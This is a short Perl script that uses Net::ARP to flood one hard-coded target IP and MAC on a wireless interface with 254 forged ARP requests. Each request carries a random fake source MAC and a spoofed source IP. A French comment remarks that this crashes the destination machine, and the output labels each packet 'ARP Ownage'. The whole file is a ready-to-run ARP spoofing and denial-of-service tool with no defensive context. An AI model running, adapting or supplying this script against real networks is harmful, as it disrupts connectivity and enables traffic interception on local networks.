#!/usr/bin/perl -w
use Net::ARP;
use strict;
$| = 1;
my $i=0;
for ($i=0;$i<254;$i++)
{
	my $fakemac = mkMACaddress();
	# Etrange... Fais planter l'IP destination !
	Net::ARP::send_packet('wlan0',                 # Device
            '10.8.106.'.$i,          # Source IP
            '10.8.102.38',          # Destination IP
            $fakemac,  # Source MAC
            '64:27:37:98:80:47',  # Destinaton MAC
            'request');             # ARP operation
	print("ARP Ownage [$i] : $fakemac !\n");
}

sub mkMACaddress {
    my @values = ();
    push(@values, sprintf("%x0", rand(0xF+1)));

    foreach (2..6) {
        push(@values, sprintf("%02x", rand(0xFF+1)));
    }

    return join(":", @values);
}
